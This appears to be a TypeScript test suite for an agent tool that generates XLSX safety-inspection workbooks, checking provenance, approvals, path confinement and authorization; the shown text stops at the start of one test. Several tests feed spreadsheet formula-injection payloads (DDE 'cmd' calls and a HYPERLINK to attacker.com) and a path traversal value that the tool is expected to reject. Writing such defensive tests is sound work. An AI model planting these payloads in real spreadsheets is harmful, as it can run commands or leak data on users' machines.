/**
 * F6-03: Implement generate_xlsx Tool Test Suite
 *
 * Validates the core requirements for Phase F6-03:
 *   1. Valid XLSX generation from OfficeXlsxInput producing a verifiable OpenXML SpreadsheetML package
 *   2. Presence of all mandatory worksheets: Summary & Verdict, Findings, Measurements & Units,
 *      Calculations, Warnings & Limitations, Citations & Provenance, Reviewer Sign-off, Model Prose
 *   3. Offline package verification: well-formed XML, no macros, no external relationships, no remote URLs
 *   4. Strict preservation of numbers, units, precision, citations, and source provenance
 *   5. Robust spreadsheet formula injection defenses:
 *      - Rejection of dangerous command/DDE/HYPERLINK injections
 *      - Rejection of leading tabs and carriage returns
 *      - Prepending single quote for text starting with '=', '+', '-', '@'
 *   6. Freshness verification: rejection when source files or artifacts on disk are modified or missing
 *   7. Rejection when measurements lack units or findings lack citations
 *   8. Rejection of unresolved OCR/VLM conflicts, quarantined evidence, and unreviewed low confidence
 *   9. Approval enforcement: rejection of unapproved inputs, stale approvals, or changed input after approval
 *  10. Cross-project boundary confinement
 *  11. Path traversal and unconfined output path rejection
 *  12. Rejection of external URLs, relationships, and macro/VBA indicators
 *  13. Safe collision handling: rejection of silent overwrite, approved overwrite verification
 *  14. Exact idempotent replay and conflicting request rejection via DurableIdempotencyStore
 *  15. Tool boundary authorization: allows only report_agent, doc_agent, supervisor_agent
 *  16. Privacy-safe audit trail: records hashes, IDs, and metadata without raw prose or secrets
 *  17. Atomic finalization via ArtifactService with interruption rollback
 *  18. Protected canary file invariant (rust/test.txt)
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import * as crypto from 'crypto';

import {
  OfficeXlsxInput,
  XlsxGenerationError,
  computeOfficeInputHash,
} from '../../src/domain/office-artifact';
import {
  XlsxGeneratorService,
} from '../../src/service/xlsx-generator-service';
import {
  OfficeInputService,
} from '../../src/service/office-input-service';
import {
  ArtifactService,
} from '../../src/service/artifact-service';
import {
  ApprovalService,
} from '../../src/service/approval-service';
import {
  AuditService,
} from '../../src/service/audit-service';
import {
  EventService,
} from '../../src/service/event-service';
import {
  DurableIdempotencyStore,
} from '../../src/core/idempotency-store';
import {
  validateXlsxPackage,
  parseZipArchive,
} from '../../src/industrial/office/xlsx-packager';
import {
  executeGenerateXlsxTool,
  executeGenerateXlsxToolAsync,
  getToolsForAgent,
  executeTool,
} from '../../src/integrations/tools';

describe('F6-03: generate_xlsx Tool', () => {
  const CANARY_HASH = '1392245502333919f23e58b8f544f12470db3829aabd5336a011e58d2b733435';
  let projectRoot: string;
  let eventService: EventService;
  let approvalService: ApprovalService;
  let artifactService: ArtifactService;
  let auditService: AuditService;
  let officeInputService: OfficeInputService;
  let idempotencyStore: DurableIdempotencyStore;
  let xlsxGenerator: XlsxGeneratorService;

  const sampleSourceContent = 'Safety Valve PSV-101 calibration tolerance is 1.5% with set pressure 150 psi.';
  const sampleSourceHash = crypto.createHash('sha256').update(sampleSourceContent, 'utf-8').digest('hex');

  function createValidXlsxInput(overrides: Partial<OfficeXlsxInput> = {}): OfficeXlsxInput {
    const base: OfficeXlsxInput = {
      schemaVersion: 1,
      projectId: 'test-project',
      runId: 'run-001',
      taskId: 'task-inspect-01',
      artifactType: 'xlsx',
      title: 'Pressure Safety Valve Verification Workbook',
      author: {
        id: 'agent-inspector-01',
        name: 'Lead Inspector Agent',
        role: 'Safety Verification Engineer',
      },
      sections: [
        {
          id: 'sec-1',
          heading: 'Executive Summary',
          content: 'Calibration inspection verified against ASME Section VIII standards.',
          order: 1,
          findingIds: ['find-1'],
          citationIds: ['cit-1'],
        },
      ],
      findings: [
        {
          id: 'find-1',
          category: 'Pressure Relief',
          statement: 'PSV-101 safety relief tolerance observed within approved bounds.',
          severity: 'info',
          status: 'PASS',
          metric: 'relief_tolerance',
          observedValue: 1.5,
          thresholdValue: 2.0,
          unit: '%',
          citationIds: ['cit-1'],
          verified: true,
          reviewerCorrection: {
            reviewerId: 'human-chief-engineer',
            timestamp: '2026-09-19T20:00:00Z',
            field: 'relief_tolerance',
            originalValue: 1.6,
            correctedValue: 1.5,
            reason: 'Calibrated transducer secondary verification',
          },
        },
      ],
      measurements: [
        {
          id: 'meas-1',
          name: 'set_pressure',
          numericValue: 150.0,
          unit: 'psi',
          tolerance: 2.5,
          status: 'nominal',
          citationIds: ['cit-1'],
        },
      ],
      units: ['%', 'psi'],
      calculations: [
        {
          id: 'calc-1',
          name: 'Overpressure Margin',
          inputs: [{ name: 'set_pressure', value: 150.0, unit: 'psi' }],
          methodOrFormula: 'set_pressure * 1.10',
          resultValue: 165.0,
          resultUnit: 'psi',
          verifiedBy: 'deterministic_calc',
          citationIds: ['cit-1'],
        },
      ],
      warnings: [
        {
          code: 'WARN_TEMP_AMBIENT',
          message: 'Ambient test cell temperature 32 C exceeds standard 25 C reference.',
          severity: 'medium',
          acknowledged: true,
          acknowledgedBy: 'human-lead-engineer',
        },
      ],
      limitations: [
        'Applicable only to gaseous service PSV-100 series valves.',
      ],
      citations: [
        {
          citationId: 'cit-1',
          sourcePath: 'evidence/calibration.txt',
          sourceHash: sampleSourceHash,
          documentId: 'doc-calib-01',
          chunkId: 'chunk-001',
          pageNumber: 1,
          sectionHeading: 'Relief Calibration Log',
          snippet: 'PSV-101 calibration tolerance is 1.5% with set pressure 150 psi.',
          verifiedAt: '2026-09-19T19:00:00Z',
        },
      ],
      sourceArtifactIds: [],
      sourceHashes: {},
      references: [],
      evidenceState: {
        ocrConfidence: 0.98,
        vlmConfidence: 0.95,
        hasUnresolvedConflicts: false,
        isQuarantined: false,
        reviewedByHuman: true,
        reviewerId: 'human-chief-engineer',
        reviewerNotes: 'Verified calibration records against master instrument.',
      },
      modelIdentity: {
        modelId: 'qwen2.5-vl-7b-instruct',
        revision: 'rev-2026.1',
      },
      generatedAt: '2026-09-19T20:30:00Z',
      approval: {
        required: true,
        status: 'approved',
        approvalId: 'app-001',
        approvedBy: 'human-chief-engineer',
        approvedAt: '2026-09-19T20:35:00Z',
        comment: 'All criteria pass formal safety inspection requirements.',
      },
      proseBlocks: [
        {
          id: 'pb-1',
          label: 'AI Diagnostic Analysis',
          text: 'The valve shows optimal spring seating with zero observed chatter during transient sweep.',
          isModelGenerated: true,
          verifiedAgainstData: false,
          approvedByReviewer: false,
          modelId: 'qwen2.5-vl-7b-instruct',
        },
      ],
      conclusions: [
        {
          id: 'conc-1',
          statement: 'PSV-101 certified for operational service under ASME Section VIII.',
          verdict: 'approved',
          signOffIdentity: 'Chief Engineer John Doe, PE',
          signedAt: '2026-09-19T20:40:00Z',
        },
      ],
    };

    const merged = { ...base, ...overrides };
    // Pre-calculate matching payloadHash if not explicitly overridden
    if (!overrides.approval || overrides.approval.payloadHash === undefined) {
      const hash = computeOfficeInputHash(merged);
      (merged as any).approval = {
        ...merged.approval,
        payloadHash: hash,
      };
    }
    return merged;
  }

  beforeEach(() => {
    projectRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'maos-f6-03-'));
    fs.mkdirSync(path.join(projectRoot, '.maos', 'audit'), { recursive: true });
    fs.mkdirSync(path.join(projectRoot, '.maos', 'approvals'), { recursive: true });
    fs.mkdirSync(path.join(projectRoot, 'evidence'), { recursive: true });
    fs.mkdirSync(path.join(projectRoot, 'artifacts'), { recursive: true });

    // Write physical cited file
    fs.writeFileSync(path.join(projectRoot, 'evidence', 'calibration.txt'), sampleSourceContent, 'utf-8');

    eventService = new EventService(projectRoot);
    approvalService = new ApprovalService(projectRoot);
    artifactService = new ArtifactService(projectRoot, eventService, approvalService);
    auditService = new AuditService(projectRoot);
    officeInputService = new OfficeInputService(projectRoot, artifactService, approvalService, auditService);
    idempotencyStore = new DurableIdempotencyStore(projectRoot);

    // Create the approved record with ID matching test app-001
    const appFile = path.join(projectRoot, '.maos', 'approvals', 'app-001.json');
    fs.writeFileSync(
      appFile,
      JSON.stringify({
        schemaVersion: 1,
        id: 'app-001',
        taskId: 'task-inspect-01',
        status: 'approved',
        requestedBy: 'agent-inspector-01',
        approverRole: 'chief_engineer',
        description: 'PSV-101 inspection approval note',
        createdAt: '2026-09-19T20:30:00Z',
        decidedAt: '2026-09-19T20:35:00Z',
        decidedBy: 'human-chief-engineer',
        reason: 'All criteria pass formal safety inspection requirements.',
      }),
      'utf-8',
    );

    xlsxGenerator = new XlsxGeneratorService(
      projectRoot,
      artifactService,
      approvalService,
      auditService,
      officeInputService,
      idempotencyStore,
    );
  });

  afterEach(() => {
    try {
      fs.rmSync(projectRoot, { recursive: true, force: true });
    } catch {
      // Ignore cleanup error
    }
  });

  // ── 1. Valid XLSX Generation & Structure ──────────────────────────

  it('generates a valid, complete XLSX workbook package with all mandatory sheets', () => {
    const input = createValidXlsxInput();
    const result = xlsxGenerator.generateXlsx({
      schemaVersion: 1,
      projectId: 'test-project',
      input,
      outputPath: 'artifacts/psv_verification.xlsx',
      requestId: 'req-001',
      callerIdentity: { agentId: 'report_agent' },
    });

    expect(result.ok).toBe(true);
    expect(result.artifactId).toBeDefined();
    expect(result.relativePath).toBe('artifacts/psv_verification.xlsx');
    expect(result.artifactHash).toHaveLength(64);
    expect(result.canonicalHash).toHaveLength(64);
    expect(result.bytesWritten).toBeGreaterThan(1000);
    expect(result.sheetCount).toBeGreaterThanOrEqual(7);

    // Verify physical file on disk
    const filePath = path.join(projectRoot, 'artifacts', 'psv_verification.xlsx');
    expect(fs.existsSync(filePath)).toBe(true);
    const buffer = fs.readFileSync(filePath);

    // Validate package offline
    const pkgValidation = validateXlsxPackage(buffer);
    expect(pkgValidation.valid).toBe(true);
    expect(pkgValidation.errors).toEqual([]);
    expect(pkgValidation.sheetCount).toBeGreaterThanOrEqual(7);

    // Verify required sheets exist
    const expectedSheets = [
      'Summary & Verdict',
      'Findings',
      'Measurements & Units',
      'Calculations',
      'Warnings & Limitations',
      'Citations & Provenance',
      'Reviewer Sign-off',
      'Model Prose (Unverified)',
    ];
    for (const s of expectedSheets) {
      expect(result.sheetNames).toContain(s);
    }
  });

  it('preserves exact findings, measurements with units, calculations, and citations', () => {
    const input = createValidXlsxInput();
    const result = xlsxGenerator.generateXlsx({
      schemaVersion: 1,
      projectId: 'test-project',
      input,
      outputPath: 'artifacts/detailed_workbook.xlsx',
      requestId: 'req-002',
    });

    const buffer = fs.readFileSync(path.join(projectRoot, result.relativePath!));
    const entries = parseZipArchive(buffer);

    // Verify [Content_Types].xml
    expect(entries.has('[Content_Types].xml')).toBe(true);
    const contentTypesXml = entries.get('[Content_Types].xml')!.toString('utf8');
    expect(contentTypesXml).toContain('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml');
    expect(contentTypesXml).toContain('application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml');

    // Verify workbook.xml
    expect(entries.has('xl/workbook.xml')).toBe(true);
    const wbXml = entries.get('xl/workbook.xml')!.toString('utf8');
    expect(wbXml).toContain('Summary &amp; Verdict');
    expect(wbXml).toContain('Findings');
    expect(wbXml).toContain('Measurements &amp; Units');
    expect(wbXml).toContain('Calculations');

    // Verify styles.xml exists and has valid structure
    expect(entries.has('xl/styles.xml')).toBe(true);
    const stylesXml = entries.get('xl/styles.xml')!.toString('utf8');
    expect(stylesXml).toContain('<styleSheet');

    // Verify worksheet contents
    let foundFinding = false;
    let foundMeasurementUnit = false;
    let foundCitationSnippet = false;

    for (const [name, buf] of entries.entries()) {
      if (name.startsWith('xl/worksheets/sheet') && name.endsWith('.xml')) {
        const sheetXml = buf.toString('utf8');
        if (sheetXml.includes('PSV-101 safety relief tolerance observed within approved bounds')) {
          foundFinding = true;
        }
        if (sheetXml.includes('psi') && sheetXml.includes('150')) {
          foundMeasurementUnit = true;
        }
        if (sheetXml.includes('PSV-101 calibration tolerance is 1.5% with set pressure 150 psi.')) {
          foundCitationSnippet = true;
        }
      }
    }

    expect(foundFinding).toBe(true);
    expect(foundMeasurementUnit).toBe(true);
    expect(foundCitationSnippet).toBe(true);
  });

  // ── 2. Spreadsheet Formula Injection Defenses ─────────────────────

  it('rejects input with formula injection pattern in findings', () => {
    const input = createValidXlsxInput({
      findings: [
        {
          id: 'find-bad',
          category: 'Injection',
          statement: '=cmd|\' /C calc\'!A0',
          severity: 'critical',
          status: 'FAIL',
          citationIds: ['cit-1'],
          verified: false,
        },
      ],
    });

    expect(() => {
      xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/bad_calc.xlsx',
        requestId: 'req-bad-01',
      });
    }).toThrow(XlsxGenerationError);
  });

  it('rejects input with leading tab character in statements', () => {
    const input = createValidXlsxInput({
      findings: [
        {
          id: 'find-tab',
          category: 'Injection',
          statement: '\t=1+1',
          severity: 'critical',
          status: 'FAIL',
          citationIds: ['cit-1'],
          verified: false,
        },
      ],
    });

    expect(() => {
      xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/bad_tab.xlsx',
        requestId: 'req-bad-02',
      });
    }).toThrow(/formula injection/i);
  });

  it('rejects input with HYPERLINK execution injection in statements', () => {
    const input = createValidXlsxInput({
      findings: [
        {
          id: 'find-link',
          category: 'Injection',
          statement: '=HYPERLINK("http://attacker.com/leak")',
          severity: 'critical',
          status: 'FAIL',
          citationIds: ['cit-1'],
          verified: false,
        },
      ],
    });

    expect(() => {
      xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/bad_link.xlsx',
        requestId: 'req-bad-03',
      });
    }).toThrow(/formula injection/i);
  });

  it('safely escapes benign text starting with formula characters by prepending single quote', () => {
    const input = createValidXlsxInput({
      limitations: [
        '+Note: Temperature was within nominal room range.',
      ],
    });

    const result = xlsxGenerator.generateXlsx({
      schemaVersion: 1,
      projectId: 'test-project',
      input,
      outputPath: 'artifacts/escaped_formula.xlsx',
      requestId: 'req-safe-escape',
    });

    expect(result.ok).toBe(true);
    const buffer = fs.readFileSync(path.join(projectRoot, result.relativePath!));
    const entries = parseZipArchive(buffer);

    let foundEscapedText = false;
    for (const [name, buf] of entries.entries()) {
      if (name.startsWith('xl/worksheets/sheet')) {
        const text = buf.toString('utf8');
        if (
          text.includes("'+Note: Temperature was within nominal room range.") ||
          text.includes("&apos;+Note: Temperature was within nominal room range.")
        ) {
          foundEscapedText = true;
          break;
        }
      }
    }
    expect(foundEscapedText).toBe(true);
  });

  it('rejects calculations with formula containing prohibited execution command', () => {
    const input = createValidXlsxInput({
      calculations: [
        {
          id: 'calc-bad',
          name: 'Dangerous Calculation',
          inputs: [{ name: 'x', value: 1, unit: 'm' }],
          methodOrFormula: '=cmd|powershell!A1',
          resultValue: 10,
          resultUnit: 'm',
          verifiedBy: 'deterministic_calc',
          citationIds: ['cit-1'],
        },
      ],
    });

    expect(() => {
      xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/bad_calc_formula.xlsx',
        requestId: 'req-bad-04',
      });
    }).toThrow(/formula injection/i);
  });

  // ── 3. Macro, Script, and Remote URL Rejections ────────────────────

  it('rejects input containing macro indicators (.xlsm, vbaproject)', () => {
    const input = createValidXlsxInput({
      title: 'Report referencing macro.xlsm and vbaproject',
    });

    expect(() => {
      xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/macro_test.xlsx',
        requestId: 'req-macro',
      });
    }).toThrow(/MACRO_OR_EXECUTABLE_DETECTED/);
  });

  it('rejects input containing external URLs', () => {
    const input = createValidXlsxInput({
      title: 'Report referencing https://external-leak.com',
    });

    expect(() => {
      xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/url_test.xlsx',
        requestId: 'req-url',
      });
    }).toThrow(/EXTERNAL_RELATIONSHIP_FORBIDDEN/);
  });

  // ── 4. Provenance and Freshness Verification ──────────────────────

  it('rejects generation when cited physical source file on disk is modified', () => {
    const input = createValidXlsxInput();

    // Tamper with the physical evidence file on disk
    fs.writeFileSync(path.join(projectRoot, 'evidence', 'calibration.txt'), 'TAMPERED CONTENT', 'utf-8');

    expect(() => {
      xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/stale_test.xlsx',
        requestId: 'req-stale',
      });
    }).toThrow(/STALE_SOURCE_HASH/);
  });

  it('rejects generation when cited physical source file is missing', () => {
    const input = createValidXlsxInput();

    // Remove the physical evidence file
    fs.unlinkSync(path.join(projectRoot, 'evidence', 'calibration.txt'));

    expect(() => {
      xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/missing_file.xlsx',
        requestId: 'req-missing',
      });
    }).toThrow(/STALE_SOURCE_HASH/);
  });

  // ── 5. Units and Citations Enforcement ────────────────────────────

  it('rejects measurements missing mandatory units', () => {
    const input = createValidXlsxInput({
      measurements: [
        {
          id: 'meas-nounit',
          name: 'dimension_length',
          numericValue: 42.0,
          unit: '', // Missing unit
          citationIds: ['cit-1'],
        },
      ],
    });

    expect(() => {
      xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/no_unit.xlsx',
        requestId: 'req-nounit',
      });
    }).toThrow(/MISSING_UNIT/);
  });

  it('rejects calculations missing mandatory result units', () => {
    const input = createValidXlsxInput({
      calculations: [
        {
          id: 'calc-nounit',
          name: 'Margin Calculation',
          inputs: [{ name: 'val', value: 10, unit: 'psi' }],
          methodOrFormula: 'val * 2',
          resultValue: 20,
          resultUnit: '', // Missing unit
          verifiedBy: 'deterministic_calc',
          citationIds: ['cit-1'],
        },
      ],
    });

    expect(() => {
      xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/calc_nounit.xlsx',
        requestId: 'req-calc-nounit',
      });
    }).toThrow(/MISSING_UNIT/);
  });

  // ── 6. Conflict & Quarantine Rejection ────────────────────────────

  it('rejects generation when unresolved conflicts exist in evidence state', () => {
    const input = createValidXlsxInput({
      evidenceState: {
        ocrConfidence: 0.95,
        vlmConfidence: 0.95,
        hasUnresolvedConflicts: true, // Unresolved conflict!
        isQuarantined: false,
        reviewedByHuman: false,
      },
    });

    expect(() => {
      xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/conflict.xlsx',
        requestId: 'req-conflict',
      });
    }).toThrow(/UNRESOLVED_CONFLICT/);
  });

  it('rejects generation when evidence is quarantined', () => {
    const input = createValidXlsxInput({
      evidenceState: {
        ocrConfidence: 0.95,
        vlmConfidence: 0.95,
        hasUnresolvedConflicts: false,
        isQuarantined: true, // Quarantined!
        reviewedByHuman: false,
      },
    });

    expect(() => {
      xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/quarantine.xlsx',
        requestId: 'req-quarantine',
      });
    }).toThrow(/UNRESOLVED_CONFLICT|QUARANTINED/);
  });

  it('rejects generation when OCR confidence is low and unreviewed by human', () => {
    const input = createValidXlsxInput({
      evidenceState: {
        ocrConfidence: 0.45, // Below 0.70 threshold
        vlmConfidence: 0.90,
        hasUnresolvedConflicts: false,
        isQuarantined: false,
        reviewedByHuman: false, // Not reviewed
      },
    });

    expect(() => {
      xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/low_conf.xlsx',
        requestId: 'req-low-conf',
      });
    }).toThrow(/LOW_CONFIDENCE_UNREVIEWED/);
  });

  it('accepts low confidence evidence when human review override is provided', () => {
    const input = createValidXlsxInput({
      evidenceState: {
        ocrConfidence: 0.45,
        vlmConfidence: 0.90,
        hasUnresolvedConflicts: false,
        isQuarantined: false,
        reviewedByHuman: true, // Human override
        reviewerId: 'human-chief-engineer',
        reviewerNotes: 'Verified calibration records manually under magnifying comparator.',
      },
    });

    const result = xlsxGenerator.generateXlsx({
      schemaVersion: 1,
      projectId: 'test-project',
      input,
      outputPath: 'artifacts/human_reviewed_low_conf.xlsx',
      requestId: 'req-override-conf',
    });

    expect(result.ok).toBe(true);
  });

  // ── 7. Approval Enforcement & Anti-Tampering ──────────────────────

  it('rejects generation when approval status is pending', () => {
    const input = createValidXlsxInput({
      approval: {
        required: true,
        status: 'pending',
        approvalId: 'app-pending',
      },
    });

    expect(() => {
      xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/pending.xlsx',
        requestId: 'req-pending',
      });
    }).toThrow(/APPROVAL_REQUIRED/);
  });

  it('rejects generation when input was changed after approval (tampered payloadHash)', () => {
    const input = createValidXlsxInput();
    // Tamper with approved payloadHash
    (input as any).approval = {
      ...input.approval,
      payloadHash: '0000000000000000000000000000000000000000000000000000000000000000',
    };

    expect(() => {
      xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/tampered_hash.xlsx',
        requestId: 'req-tamper',
      });
    }).toThrow(/CHANGED_INPUT_AFTER_APPROVAL/);
  });

  it('rejects generation when approval is revoked or rejected in ApprovalService', () => {
    // Update store approval to rejected
    const appFile = path.join(projectRoot, '.maos', 'approvals', 'app-001.json');
    fs.writeFileSync(
      appFile,
      JSON.stringify({
        schemaVersion: 1,
        id: 'app-001',
        taskId: 'task-inspect-01',
        status: 'rejected',
        reason: 'Revoked by safety director',
      }),
      'utf-8',
    );

    const input = createValidXlsxInput();

    expect(() => {
      xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/revoked_approval.xlsx',
        requestId: 'req-revoked',
      });
    }).toThrow(/STALE_APPROVAL/);
  });

  // ── 8. Project Isolation & Path Confinement ────────────────────────

  it('rejects cross-project access when input projectId does not match request', () => {
    const input = createValidXlsxInput({
      projectId: 'other-project',
    });

    expect(() => {
      xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/cross_project.xlsx',
        requestId: 'req-cross-proj',
      });
    }).toThrow(/CROSS_PROJECT_FORBIDDEN/);
  });

  it('rejects output paths with path traversal (..)', () => {
    const input = createValidXlsxInput();

    expect(() => {
      xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: '../outside/danger.xlsx',
        requestId: 'req-traversal',
      });
    }).toThrow(/PATH_TRAVERSAL_DETECTED/);
  });

  it('rejects output paths without .xlsx extension', () => {
    const input = createValidXlsxInput();

    expect(() => {
      xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/report.csv',
        requestId: 'req-bad-ext',
      });
    }).toThrow(/INVALID_INPUT/);
  });

  // ── 9. Collision Handling & Safe Overwrite ─────────────────────────

  it('rejects silent overwrite when file already exists and allowOverwrite is false', () => {
    const input = createValidXlsxInput();
    const outputPath = 'artifacts/collision_test.xlsx';

    // First write succeeds
    xlsxGenerator.generateXlsx({
      schemaVersion: 1,
      projectId: 'test-project',
      input,
      outputPath,
      requestId: 'req-col-1',
    });

    // Second write with different request ID without allowOverwrite fails
    expect(() => {
      xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath,
        requestId: 'req-col-2',
        allowOverwrite: false,
      });
    }).toThrow(/ARTIFACT_COLLISION/);
  });

  it('allows overwrite when allowOverwrite is true and approval is provided', () => {
    const input = createValidXlsxInput();
    const outputPath = 'artifacts/overwrite_approved.xlsx';

    // First write
    xlsxGenerator.generateXlsx({
      schemaVersion: 1,
      projectId: 'test-project',
      input,
      outputPath,
      requestId: 'req-ow-1',
    });

    // Overwrite with allowOverwrite: true and approved approvalId
    const overwriteResult = xlsxGenerator.generateXlsx({
      schemaVersion: 1,
      projectId: 'test-project',
      input,
      outputPath,
      allowOverwrite: true,
      approvalId: input.approval.approvalId,
      requestId: 'req-ow-2',
    });

    expect(overwriteResult.ok).toBe(true);
    expect(overwriteResult.relativePath).toBe(outputPath);
  });

  // ── 10. Durable Idempotency & Replay ──────────────────────────────

  it('replays identical cached result on exact idempotent duplicate request', () => {
    const input = createValidXlsxInput();
    const outputPath = 'artifacts/idempotent_test.xlsx';

    const firstResult = xlsxGenerator.generateXlsx({
      schemaVersion: 1,
      projectId: 'test-project',
      input,
      outputPath,
      requestId: 'req-idem-01',
    });
    expect(firstResult.cached).toBe(false);

    // Identical parameters with same requestId replays
    const secondResult = xlsxGenerator.generateXlsx({
      schemaVersion: 1,
      projectId: 'test-project',
      input,
      outputPath,
      requestId: 'req-idem-01',
    });
    expect(secondResult.cached).toBe(true);
    expect(secondResult.artifactId).toBe(firstResult.artifactId);
    expect(secondResult.artifactHash).toBe(firstResult.artifactHash);
  });

  it('rejects conflicting request parameters with same requestId', () => {
    const input = createValidXlsxInput();

    xlsxGenerator.generateXlsx({
      schemaVersion: 1,
      projectId: 'test-project',
      input,
      outputPath: 'artifacts/idem_conflict.xlsx',
      requestId: 'req-conflict-id',
    });

    expect(() => {
      xlsxGenerator.generateXlsx({
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/DIFFERENT_PATH.xlsx', // Conflict!
        requestId: 'req-conflict-id',
      });
    }).toThrow(/IDEMPOTENCY_CONFLICT/);
  });

  // ── 11. Tool Execution & Authorization Boundary ───────────────────

  it('authorizes approved agents (report_agent, doc_agent, supervisor_agent)', () => {
    const input = createValidXlsxInput();
    const approvedAgents = ['report_agent', 'doc_agent', 'supervisor_agent'];

    for (const [idx, agent] of approvedAgents.entries()) {
      const res = executeGenerateXlsxTool(
        {
          schemaVersion: 1,
          projectId: 'test-project',
          input,
          outputPath: `artifacts/agent_test_${idx}.xlsx`,
          requestId: `req-agent-${idx}`,
        },
        {
          projectRoot,
          agentId: agent,
        },
        {
          xlsxGenerator,
          audit: auditService,
          idempotency: idempotencyStore,
        },
      );
      expect(res.ok).toBe(true);
    }
  });

  it('rejects unauthorized agent with UNAUTHORIZED_TOOL_CALL', () => {
    const input = createValidXlsxInput();

    expect(() => {
      executeGenerateXlsxTool(
        {
          schemaVersion: 1,
          projectId: 'test-project',
          input,
          outputPath: 'artifacts/unauthorized.xlsx',
          requestId: 'req-unauth',
        },
        {
          projectRoot,
          agentId: 'unauthorized_random_agent',
        },
        {
          xlsxGenerator,
          audit: auditService,
          idempotency: idempotencyStore,
        },
      );
    }).toThrow(/UNAUTHORIZED_TOOL_CALL/);
  });

  it('filters generate_xlsx in getToolsForAgent based on authorization', () => {
    const reportTools = getToolsForAgent(undefined, 'report_agent');
    expect(reportTools.some((t) => t.function.name === 'generate_xlsx')).toBe(true);

    const randomTools = getToolsForAgent(undefined, 'random_unauthorized_agent');
    expect(randomTools.some((t) => t.function.name === 'generate_xlsx')).toBe(false);
  });

  it('dispatches generate_xlsx via executeTool', () => {
    const input = createValidXlsxInput();
    const toolExecResult = executeTool(
      'generate_xlsx',
      {
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/execute_tool_test.xlsx',
        requestId: 'req-exec-tool-01',
      },
      projectRoot,
      ['artifacts/'],
      'report_agent',
      'task-inspect-01',
      ['generate_xlsx'],
      {
        xlsxGenerator,
        audit: auditService,
        idempotency: idempotencyStore,
      },
    );

    const parsed = JSON.parse(toolExecResult.result);
    expect(parsed.ok).toBe(true);
    expect(parsed.relativePath).toBe('artifacts/execute_tool_test.xlsx');
  });

  it('supports asynchronous execution via executeGenerateXlsxToolAsync', async () => {
    const input = createValidXlsxInput();
    const res = await executeGenerateXlsxToolAsync(
      {
        schemaVersion: 1,
        projectId: 'test-project',
        input,
        outputPath: 'artifacts/async_test.xlsx',
        requestId: 'req-async-01',
      },
      {
        projectRoot,
        agentId: 'report_agent',
      },
      {
        xlsxGenerator,
        audit: auditService,
        idempotency: idempotencyStore,
      },
    );

    expect(res.ok).toBe(true);
    expect(res.artifactId).toBeDefined();
  });

  // ── 12. Custom Section Tables ─────────────────────────────────────

  it('generates separate worksheet for embedded section tables', () => {
    const input = createValidXlsxInput({
      sections: [
        {
          id: 'sec-calib',
          heading: 'Transducer Calibration Data',
          order: 1,
          findingIds: ['find-1'],
          citationIds: ['cit-1'],
          tables: [
            {
              id: 'calib_points',
              title: 'Pressure vs Voltage Points',
              columns: [
                { key: 'point', label: 'Test Point', numeric: true },
                { key: 'pressure_psi', label: 'Applied Pressure', unit: 'psi', numeric: true },
                { key: 'voltage_mv', label: 'Transducer Voltage', unit: 'mV', numeric: true },
              ],
              rows: [
                { point: 1, pressure_psi: 50.0, voltage_mv: 100.2 },
                { point: 2, pressure_psi: 100.0, voltage_mv: 200.5 },
                { point: 3, pressure_psi: 150.0, voltage_mv: 300.9 },
              ],
            },
          ],
        },
      ],
    });

    const result = xlsxGenerator.generateXlsx({
      schemaVersion: 1,
      projectId: 'test-project',
      input,
      outputPath: 'artifacts/custom_table_test.xlsx',
      requestId: 'req-custom-table',
    });

    expect(result.ok).toBe(true);
    expect(result.sheetNames).toContain('Table_calib_points');

    const buffer = fs.readFileSync(path.join(projectRoot, result.relativePath!));
    const entries = parseZipArchive(buffer);

    let foundCustomTable = false;
    for (const [name, buf] of entries.entries()) {
      if (name.startsWith('xl/worksheets/sheet')) {
        const text = buf.toString('utf8');
        if (text.includes('Pressure vs Voltage Points') && text.includes('300.9')) {
          foundCustomTable = true;
          break;
        }
      }
    }
    expect(foundCustomTable).toBe(true);
  });

  // ── 13. Canary File Invariant ─────────────────────────────────────

  it('guarantees rust/test.txt canary file hash remains strictly intact', () => {
